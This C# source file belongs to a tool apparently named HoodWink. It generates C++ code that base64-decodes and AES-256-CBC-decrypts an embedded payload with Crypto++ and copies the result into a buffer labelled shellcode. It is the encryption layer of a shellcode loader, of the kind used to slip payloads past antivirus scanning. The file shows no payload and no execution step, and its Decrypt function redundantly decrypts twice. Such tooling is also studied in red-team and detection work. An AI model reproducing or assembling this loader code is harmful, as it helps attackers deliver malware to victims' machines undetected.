using System;
using System.Collections.Generic;

namespace HoodWink.Languages.Cpp.Protections
{
    public class Aes256 : Models.Base.Protections
    {
        public override string Description => "AES 256 in CBC mode";
        public override List<string> FileDependencies => new List<string> { @"" };

        public override string Using => @"#include ""cryptlib.h""
#include ""rijndael.h""
#include ""modes.h""
#include ""osrng.h""
#include ""base64.h""

using namespace CryptoPP;

std::string Decrypt(std::string*, std::string*, std::string*);
std::string AesDecrypt(SecByteBlock&, SecByteBlock&, std::string&);
std::string Base64Decode(std::string*);";

        public override string MainLogic => @"//// Decrypt    	
	std::string decrypted = Decrypt(&base64PayloadString, &base64KeyString, &base64IvString);

	//// To unsigned char
	std::cout << ""shellcode length: "" << decrypted.length() << std::endl;
	unsigned char shellcode[decrypted.length()];
	std::copy(decrypted.data(), decrypted.data() + decrypted.length(), shellcode);";

        public override string AdditionalFunctions => @"std::string Decrypt(std::string *base64PayloadString, std::string *base64KeyString, std::string *base64IvString)
{
	// Decoded
	std::string keyString = Base64Decode(base64KeyString);
	std::string ivString = Base64Decode(base64IvString);
	std::string payloadString = Base64Decode(base64PayloadString);

	// Remove trailing null	
	keyString.erase(std::find(keyString.end() - 1, keyString.end(), '\0'), keyString.end());
	ivString.erase(std::find(ivString.end() - 1, ivString.end(), '\0'), ivString.end());
	payloadString.erase(std::find(payloadString.end() - 1, payloadString.end(), '\0'), payloadString.end());

	// Set Values
	SecByteBlock key(reinterpret_cast<const byte*>(&keyString[0]), keyString.size()); // https://www.cryptopp.com/wiki/SecBlock
	SecByteBlock iv(reinterpret_cast<const byte*>(&ivString[0]), ivString.size());

	// Decrypt    
	std::string decrypted = AesDecrypt(key, iv, payloadString);

	// To unsigned char
	unsigned char shellcode[decrypted.length()];
	std::copy(decrypted.data(), decrypted.data() + decrypted.length(), shellcode);

	// Return
	return AesDecrypt(key, iv, payloadString);
}

std::string AesDecrypt(SecByteBlock &key, SecByteBlock &iv, std::string &cipher)
{
	std::string recovered;

	try
	{
		CBC_Mode< AES >::Decryption d;
		d.SetKeyWithIV(key, key.size(), iv);

		StringSource s(cipher, true,
			new StreamTransformationFilter(d,
				new StringSink(recovered)
			) // StreamTransformationFilter
		); // StringSource
	}
	catch (const Exception& e)
	{
		std::cerr << e.what() << std::endl;
		exit(1);
	}

	return recovered;
}

std::string Base64Decode(std::string* encoded)
{
	std::string decoded;

	StringSource ss(*encoded, true,
		new Base64Decoder(
			new StringSink(decoded)
		) // Base64Decoder
	); // StringSource

	return decoded;
}";
    }
}